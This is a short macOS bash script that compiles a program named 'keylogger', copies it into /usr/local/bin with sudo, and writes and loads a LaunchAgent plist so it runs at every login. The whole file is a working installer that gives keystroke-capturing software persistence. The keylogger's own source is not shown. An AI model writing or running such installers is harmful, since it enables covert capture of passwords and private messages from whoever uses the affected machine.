#!/bin/bash

# Compile the keylogger
make

# Install the keylogger
sudo cp keylogger /usr/local/bin/
sudo chmod +x /usr/local/bin/keylogger

# Create a launch agent to start the keylogger on boot
AGENT_PATH="$HOME/Library/LaunchAgents/com.user.keylogger.plist"
echo '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.keylogger</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/keylogger</string>
    </array>
    <key>RunAtLoad</key>
        <true/>
</dict>
</plist>' > "$AGENT_PATH"

# Load the launch agent
launchctl load "$AGENT_PATH"